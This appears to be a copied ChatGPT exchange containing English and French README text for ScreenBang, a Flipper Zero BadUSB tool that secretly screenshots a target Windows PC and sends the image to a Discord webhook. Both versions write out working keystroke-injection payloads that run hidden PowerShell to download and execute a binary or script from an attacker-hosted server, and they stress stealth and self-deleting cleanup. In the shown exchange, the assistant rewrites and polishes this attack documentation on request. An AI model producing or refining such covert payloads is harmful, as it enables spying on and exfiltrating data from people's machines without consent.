ScreenBang
ScreenBang is a Flipper Zero payload designed to discreetly capture a screenshot of a target Windows machine and send it directly to a Discord server via a webhook. It provides both a Python-based option and a standalone executable for flexible use.

Features
📸 Screenshot Capture: Takes a full-screen screenshot of the target machine.
🚀 Discord Webhook Integration: Sends screenshots directly to a Discord channel.
🧹 Automatic Cleanup: Deletes temporary files, including the executable, after execution.
🕵️ Stealth Mode: Uses hidden PowerShell commands to operate without drawing attention.
🔌 Flipper Zero Integration: Works seamlessly with Flipper Zero in BadUSB mode.
Project Structure
bash
Copier le code
ScreenBang/
│
├── bang.py               # Python script for screenshot capture and Discord webhook
├── bang.exe              # Compiled standalone executable of bang.py
├── app.py                # Flask server for hosting scripts
├── Screen Bang PY        # Payload for downloading and executing bang.py
├── Screen Bang EXE       # Payload for downloading and executing bang.exe
├── LICENSE               # MIT license file
├── README.md             # Documentation (English and French)
Requirements
A Flipper Zero device with BadUSB enabled.
A Discord Webhook URL.
A Windows machine (7, 10, or 11).
Optional: Python-based setup
Python 3.8+ installed on the target machine.
Python libraries: requests, Pillow.
Installation
1. Modify the Webhook URL
Before using the Python script, you need to replace the placeholder webhook URL with your own Discord webhook.

Open bang.py in a text editor.
Locate the line:
python
Copier le code
WEBHOOK_URL = "<Your discord webhook here>"
Replace <Your discord webhook here> with your Discord webhook URL. For example:
python
Copier le code
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"
Save the file.
2. Deploy the Flask Server
Clone the repository:
bash
Copier le code
git clone https://github.com/DuarteAd/ScreenBang.git
cd ScreenBang
Install dependencies for the Flask server:
bash
Copier le code
pip install -r requirements.txt
Deploy the server (e.g., on Heroku):
bash
Copier le code
heroku create
git push heroku main
The Flask server will host bang.py and bang.exe for the payloads to download.
3. Prepare Flipper Zero Payloads
For the executable:
Use the Screen Bang EXE payload to download and execute bang.exe:
plaintext
Copier le code
REM Download and execute bang.exe
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source 'https://<your-heroku-app>.herokuapp.com/bang.exe' -Destination 'C:\Temp\bang.exe'; Start-Process -WindowStyle Hidden -FilePath 'C:\Temp\bang.exe'}"
ENTER
For the Python script:
Use the Screen Bang PY payload to download and execute bang.py:
plaintext
Copier le code
REM Download and execute bang.py
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Invoke-WebRequest -Uri 'https://<your-heroku-app>.herokuapp.com/bang.py' -OutFile 'C:\Temp\bang.py'; python C:\Temp\bang.py"
ENTER
Usage
Deploy the payload to your Flipper Zero.
Connect the Flipper Zero to the target Windows machine.
Execute the payload to capture a screenshot and send it to Discord.
Disclaimer
This project is for educational purposes only.
Unauthorized use of this tool is strictly prohibited and may violate local laws.
Always ensure you have explicit permission before testing this on any machine.
ScreenBang
ScreenBang est un payload conçu pour le Flipper Zero, permettant de capturer discrètement l'écran d'une machine Windows cible et de l'envoyer directement à un serveur Discord via un webhook. Il offre une option basée sur Python ainsi qu'une version exécutable autonome.

Fonctionnalités
📸 Capture d'écran : Capture l'écran complet de la machine cible.
🚀 Intégration Discord : Envoie les captures directement à un canal Discord.
🧹 Nettoyage automatique : Supprime les fichiers temporaires après exécution.
🕵️ Mode furtif : Utilise des commandes PowerShell masquées pour rester discret.
🔌 Intégration Flipper Zero : Fonctionne parfaitement avec le mode BadUSB du Flipper Zero.
Structure du projet
bash
Copier le code
ScreenBang/
│
├── bang.py               # Script Python pour la capture et Discord
├── bang.exe              # Version autonome compilée de bang.py
├── app.py                # Serveur Flask pour héberger les scripts
├── Screen Bang PY        # Payload pour télécharger et exécuter bang.py
├── Screen Bang EXE       # Payload pour télécharger et exécuter bang.exe
├── LICENSE               # Licence MIT
├── README.md             # Documentation (anglais et français)
Prérequis
Un Flipper Zero avec le mode BadUSB activé.
Un webhook Discord valide.
Une machine Windows (7, 10 ou 11).
Optionnel : Configuration Python
Python 3.8+ installé sur la machine cible.
Bibliothèques Python nécessaires : requests, Pillow.
Installation
1. Modifier l'URL du Webhook
Avant d'utiliser le script Python, vous devez remplacer l'URL du webhook par votre propre URL Discord.

Ouvrez bang.py dans un éditeur de texte.
Trouvez la ligne suivante :
python
Copier le code
WEBHOOK_URL = "<Your discord webhook here>"
Remplacez <Your discord webhook here> par votre URL de webhook Discord. Exemple :
python
Copier le code
WEBHOOK_URL = "https://discord.com/api/webhooks/votre_webhook_id/votre_webhook_token"
Enregistrez le fichier.
2. Déployer le serveur Flask
Clonez le dépôt :
bash
Copier le code
git clone https://github.com/DuarteAd/ScreenBang.git
cd ScreenBang
Installez les dépendances :
bash
Copier le code
pip install -r requirements.txt
Déployez sur Heroku ou un autre service :
bash
Copier le code
heroku create
git push heroku main
3. Préparer les payloads pour le Flipper Zero
Pour l'exécutable :
Utilisez le payload Screen Bang EXE pour télécharger et exécuter bang.exe.
Pour le script Python :
Utilisez le payload Screen Bang PY pour télécharger et exécuter bang.py.
Utilisation
Chargez le payload sur votre Flipper Zero.
Connectez le Flipper Zero à la machine cible.
Exécutez le payload pour capturer l'écran et l'envoyer sur Discord.
Avertissement
Ce projet est destiné uniquement à des fins éducatives.
Toute utilisation non autorisée est strictement interdite et peut enfreindre la loi.
Assurez-vous d'avoir une autorisation explicite avant d'utiliser cet outil.
Avec ces ajouts, votre README est détaillé, multilingue et convivial pour les utilisateurs. 🚀





Vous avez dit :
j'aimerai que tu le re écrive, avec des crédit cette fois
ChatGPT a dit :
Voici un README complet et enrichi, avec une section Crédits pour donner un crédit approprié. Il est rédigé de manière professionnelle, lisible, et organisé.

ScreenBang
ScreenBang is a Flipper Zero payload designed to discreetly capture a screenshot of a target Windows machine and send it directly to a Discord server via a webhook. This tool provides both a Python-based solution and a standalone executable for flexible and seamless use.

Features
📸 Screenshot Capture: Takes a full-screen screenshot of the target machine.
🚀 Discord Webhook Integration: Automatically sends screenshots to a Discord channel.
🧹 Automatic Cleanup: Deletes temporary files, including the executable, after execution.
🕵️ Stealth Mode: Operates using hidden PowerShell commands to avoid detection.
🔌 Flipper Zero Integration: Designed specifically for Flipper Zero's BadUSB functionality.
Project Structure
bash
Copier le code
ScreenBang/
│
├── bang.py               # Python script for screenshot capture and Discord webhook
├── bang.exe              # Compiled standalone executable of bang.py
├── app.py                # Flask server for hosting the scripts
├── Screen Bang PY        # Payload for downloading and executing bang.py
├── Screen Bang EXE       # Payload for downloading and executing bang.exe
├── LICENSE               # MIT license
├── README.md             # Project documentation
Requirements
A Flipper Zero device with BadUSB functionality enabled.
A Discord Webhook URL.
A target machine running Windows (7, 10, or 11).
Optional: Python-based setup
Python 3.8+ installed on the target machine.
Required Python libraries:
requests
Pillow
Installation
1. Modify the Webhook URL
To use the Python script, you must replace the placeholder webhook URL with your own.

Open bang.py in any text editor.
Locate the line:
python
Copier le code
WEBHOOK_URL = "<Your discord webhook here>"
Replace <Your discord webhook here> with your actual Discord webhook URL. For example:
python
Copier le code
WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"
Save the file.
2. Deploy the Flask Server
Clone the repository:
bash
Copier le code
git clone https://github.com/DuarteAd/ScreenBang.git
cd ScreenBang
Install dependencies for the Flask server:
bash
Copier le code
pip install -r requirements.txt
Deploy the server to a cloud platform (e.g., Heroku):
bash
Copier le code
heroku create
git push heroku main
The server will host bang.py and bang.exe for payloads to download.
3. Prepare Flipper Zero Payloads
For the executable:
Use the Screen Bang EXE payload:
plaintext
Copier le code
REM Download and execute bang.exe
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "& {Start-BitsTransfer -Source 'https://<your-heroku-app>.herokuapp.com/bang.exe' -Destination 'C:\Temp\bang.exe'; Start-Process -WindowStyle Hidden -FilePath 'C:\Temp\bang.exe'}"
ENTER
For the Python script:
Use the Screen Bang PY payload:
plaintext
Copier le code
REM Download and execute bang.py
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Invoke-WebRequest -Uri 'https://<your-heroku-app>.herokuapp.com/bang.py' -OutFile 'C:\Temp\bang.py'; python C:\Temp\bang.py"
ENTER
Usage
Load the payload onto your Flipper Zero.
Connect the Flipper Zero to the target Windows machine.
Execute the payload to capture a screenshot and send it to Discord.
Disclaimer
This project is for educational purposes only.
Unauthorized use of this tool is strictly prohibited and may violate local laws.
Ensure you have explicit permission before using this tool on any machine.
Credits
This project was developed by DuarteAd with the goal of providing a practical and educational example of Flipper Zero's BadUSB capabilities.

Special Thanks
The Flipper Zero Community for their continuous support and innovation.
The developers of Pillow and Requests for enabling key functionalities in this project.
Everyone who contributed feedback and testing to improve ScreenBang.
License
This project is licensed under the MIT License. You are free to use, modify, and distribute this software, provided you include proper credit to the original author.

Support
If you encounter any issues or have suggestions for improvement, feel free to open an issue on GitHub.

